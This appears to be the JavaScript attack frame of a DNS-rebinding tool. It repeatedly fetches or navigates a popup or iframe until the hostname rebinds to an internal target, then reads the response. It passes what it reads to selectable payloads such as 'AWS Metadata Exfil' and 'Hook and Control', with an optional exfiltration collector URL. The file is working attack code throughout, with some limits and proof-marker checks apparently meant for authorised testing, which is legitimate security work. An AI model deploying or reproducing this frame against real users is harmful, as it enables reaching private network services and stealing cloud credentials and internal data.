// Horizon-compatible attack frame. CONFIG comes only from html/amaze.html.
let Registry = {};
let horizonConfig = {};
let sooFetch = (resource, options) => fetch(resource, options);
const payloadFiles = {"AWS Metadata Exfil":"aws-metadata-exfil.js", "Hook and Control":"hook-and-control.js", "Read Response":"read-response.js"};
const managerOrigin = new URLSearchParams(location.search).get("parentOrigin");
let running=false, stopped=false, completed=false, popup=null, cfgReady=Promise.resolve(), selected="Read Response";
const status=message=>{document.getElementById("rebindingstatus").textContent=message;console.log("[horizon]",message);};
const send=(data)=>{if(managerOrigin)window.parent.postMessage(data,managerOrigin);};
const nonce=()=>Array.from(crypto.getRandomValues(new Uint8Array(8)),x=>x.toString(16).padStart(2,"0")).join("");
const horizonWait=ms=>new Promise(resolve=>setTimeout(resolve,ms));
function httpHeaderstoText(headers){return headers?Array.from(headers,([k,v])=>`${k}: ${v}`).join("\n"):"";}
function entryDocument(doc){const timing=popup?.performance.getEntriesByType("navigation")[0];return timing?.serverTiming?.some(x=>x.name==="horizon-entry") || !!doc.querySelector("[data-horizon-entry]") || (horizonConfig.indexToken && doc.documentElement.outerHTML.includes(horizonConfig.indexToken));}
function targetURL(){const u=new URL(horizonConfig.targetPath||"/",location.origin);if(u.origin!==location.origin)throw new Error("targetPath must remain same-origin");u.searchParams.set("__horizon",nonce());return u;}
async function readFetch(fn){
  const controller=new AbortController(),timer=setTimeout(()=>controller.abort(),horizonConfig.requestTimeoutMS||4000);
  try{const r=await fn(targetURL().href,{cache:"no-store",credentials:"omit",redirect:"error",signal:controller.signal});
    if(r.headers.get("X-Singularity-Of-Origin")==="t")return null;
    const reader=r.body?.getReader();if(!reader)return null;let size=0,body="";const decoder=new TextDecoder(),limit=horizonConfig.maxResponseBytes||65536;
    try{while(size<limit){const chunk=await reader.read();if(chunk.done)break;const bytes=chunk.value.subarray(0,limit-size);size+=bytes.length;body+=decoder.decode(bytes,{stream:true});}body+=decoder.decode();}finally{await reader.cancel();}
    if(!body||body.includes("data-horizon-entry")||(horizonConfig.indexToken&&body.includes(horizonConfig.indexToken)))return null;
    if(horizonConfig.proofMarker&&!body.includes(horizonConfig.proofMarker))return null;
    return {headers:r.headers,body};
  }finally{clearTimeout(timer);}
}
async function configure(c){
  horizonConfig=c;selected=c.attackPayload;
  if(!["navigation","fetch","iframe"].includes(c.attackMethod))throw new Error("Invalid attackMethod");
  if(!payloadFiles[selected])throw new Error("Unknown attackPayload");
  const p=new URL(c.targetPath,location.origin);if(p.origin!==location.origin||!c.targetPath.startsWith("/")||c.targetPath.startsWith("//")||/[\\\r\n]/.test(c.targetPath))throw new Error("Invalid targetPath");
  const collector=c.exfiltrationURL||"";if(collector&&!/^https?:$/.test(new URL(collector).protocol))throw new Error("Collector URL must use HTTP/HTTPS");
  if(!Number.isFinite(Number(c.interval))||Number(c.interval)<1||Number(c.interval)>120||!Number.isInteger(c.runTimeoutSeconds)||c.runTimeoutSeconds<5||c.runTimeoutSeconds>600||!Number.isInteger(c.requestTimeoutMS)||c.requestTimeoutMS<250||c.requestTimeoutMS>30000||!Number.isInteger(c.maxResponseBytes)||c.maxResponseBytes<256||c.maxResponseBytes>1048576)throw new Error("Invalid interval, timeout or response limits");
  await new Promise((resolve,reject)=>{const s=document.createElement("script");s.src="/payloads/"+payloadFiles[selected];s.onload=resolve;s.onerror=()=>reject(new Error("Could not load selected payload"));document.head.appendChild(s);});
}
function finish(body,headers=null,method="navigation"){
  if(stopped||completed)return;completed=true;
  status(`Readable response via ${method}. ${horizonConfig.proofMarker?"Configured marker matched.":"No proof marker configured; verify the content and target logs."}`);
  console.log("[horizon] response",body);send({status:"success",response:body,method,proofMarkerVerified:!!horizonConfig.proofMarker});
  if(method==="navigation")sooFetch=(resource,options)=>popup.fetch(resource,options);
  Registry[selected].attack(headers,null,body,horizonConfig.wsProxyPort);
}
async function runNavigation(){
  // Must occur synchronously in the user's click, before an await.
  popup=window.open("/?__horizon_entry="+nonce(),"horizon-popup-"+nonce(),"popup,width=650,height=480");
  if(!popup){status("Popup blocked. Allow it and click Start again.");return;}
  running=true;const start=performance.now(),deadline=start+horizonConfig.runTimeoutSeconds*1000,interval=Number(horizonConfig.interval)*1000;
  let nextProbe=start,nextNavigation=start+interval,lastURL=null,sawFetchError=false;
  status("Waiting for DNS rebinding; popup is visible.");
  while(!stopped&&performance.now()<deadline){
    if(popup.closed){status("Popup closed or opener reference severed.");return;}
    try{if(lastURL&&popup.location.origin===location.origin&&popup.location.href===lastURL&&popup.document.readyState==="complete"&&!entryDocument(popup.document)){
      const text=popup.document.body?.innerText||"";if(text&&(!horizonConfig.proofMarker||text.includes(horizonConfig.proofMarker))){
        const html=popup.document.documentElement.outerHTML,bytes=new TextEncoder().encode(html.slice(0,horizonConfig.maxResponseBytes));const body=new TextDecoder().decode(bytes.subarray(0,horizonConfig.maxResponseBytes),{stream:true});
        finish(body,null,"navigation");console.log("[horizon] comparison fetch rejected:",sawFetchError,"(LNA cause requires browser evidence)");return;
      }
    }}catch(e){/* Unreadable/loading documents are not success. */}
    if(performance.now()>=nextProbe){try{const r=await readFetch(fetch);if(r)console.log("[horizon] fetch comparison also readable; this does not establish a fetch-blocking bypass.");}catch(e){sawFetchError=true;console.log("[horizon] fetch comparison rejected; cause not established:",e.name,e.message);}nextProbe=performance.now()+interval;}
    if(stopped||performance.now()>=deadline)break;
    if(performance.now()>=nextNavigation||(!lastURL&&sawFetchError)){lastURL=targetURL().href;try{popup.location.href=lastURL;}catch(e){status("Navigation prevented: "+e.message);return;}nextNavigation=performance.now()+Math.max(interval,5000);}
    await horizonWait(250);
  }
  status(stopped?"Stopped":"Timed out without a readable target document.");
}
async function runLegacy(method){
  if(running)return;running=true;const deadline=performance.now()+horizonConfig.runTimeoutSeconds*1000;let child=null;
  if(method==="iframe"){child=document.createElement("iframe");child.src="/";child.hidden=true;document.body.appendChild(child);}
  while(!stopped&&performance.now()<deadline){try{
    if(child){child.src="/?__horizon="+nonce();await horizonWait(1000);sooFetch=(resource,options)=>child.contentWindow.fetch(resource,options);}
    const r=await readFetch(sooFetch);if(r){finish(r.body,r.headers,method);return;}
  }catch(e){console.log("[horizon] waiting:",e.message);}await horizonWait(Number(horizonConfig.interval)*1000);}
  status(stopped?"Stopped":"Timed out without a target response.");
}
function begin(){
  document.getElementById("hostname").textContent=location.host;
  window.addEventListener("message",e=>{
    if(e.source!==window.parent||e.origin!==managerOrigin||!e.data||typeof e.data!=="object")return;
    if(e.data.cmd==="configure"){cfgReady=configure(e.data.param);cfgReady.catch(e=>status(e.message));}
    if(e.data.cmd==="stop"){if(!completed){stopped=true;popup?.close();status("Stopped");}return;}
    if(["startNavigation","startFetch","startReloadChildFrame"].includes(e.data.cmd))cfgReady.then(()=>{
      if(e.data.cmd==="startNavigation"){
        const b=document.createElement("button");b.textContent="Start navigation test";document.body.appendChild(b);
        b.onclick=()=>{if(running)return;runNavigation().catch(e=>status(e.message));if(popup)b.disabled=true;};
        const stop=document.createElement("button");stop.textContent="Stop";stop.onclick=()=>{stopped=true;popup?.close();status("Stopped");};document.body.appendChild(stop);
        status("Click Start navigation test to open the popup.");
      }else runLegacy(e.data.cmd==="startFetch"?"fetch":"iframe").catch(e=>status(e.message));
    }).catch(e=>status(e.message));
  });
  send({status:"start"});
}
window.addEventListener("pagehide",()=>{stopped=true;popup?.close();});
